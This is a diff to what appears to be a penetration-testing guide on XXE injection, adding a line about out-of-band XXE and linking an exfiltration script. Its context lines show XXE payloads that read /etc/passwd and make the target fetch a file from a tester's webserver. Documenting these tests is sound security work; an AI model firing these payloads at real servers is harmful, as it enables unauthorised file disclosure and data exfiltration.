@@ -100,15 +100,13 @@ If "testdata" gets reflected then it is vulnerable to XXE. If it gets reflected 
 <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
 ```
 
-Another way to test it is to see if the server tries to download the external script. First you need to set up your own webserver, and then wait for it to connect.
+Another way to test it is to see if the server tries to download the external script. First you need to set up your own webserver, and then wait for it to connect.  This is known as an Out-of-Bound XXE.
 
 ```
 <!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://192.168.1.101/fil.txt">]><test>&xxe;</test>
 ```
 
-## Blind XXE
-
-In some cases, you won't receive any output from the 
+Automated tools for OOB XXE include [xxe-oob-exfil.py](https://gist.github.com/Reboare/49b309711222254eaf970e90388a7bdf).
 
 ### Exfiltrate data through URL
 
